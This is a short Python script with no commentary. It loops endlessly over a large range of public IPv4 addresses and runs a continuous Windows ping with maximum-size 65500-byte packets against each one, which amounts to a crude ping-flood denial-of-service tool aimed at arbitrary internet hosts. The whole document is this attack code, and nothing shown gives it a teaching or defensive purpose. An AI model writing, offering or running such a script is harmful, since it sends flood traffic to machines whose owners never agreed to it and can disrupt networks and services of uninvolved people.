from subprocess import run
while True:
    for a in range(127,255):
        for b in range(255):
            for c in range(255):
                for d in range(1,255):
                    string = 'ping -t -l 65500 ' + \
                        str(a)+'.'+str(b)+'.'+str(c)+'.'+str(d)
                    try:
                        run(string)
                    except :
                        pass
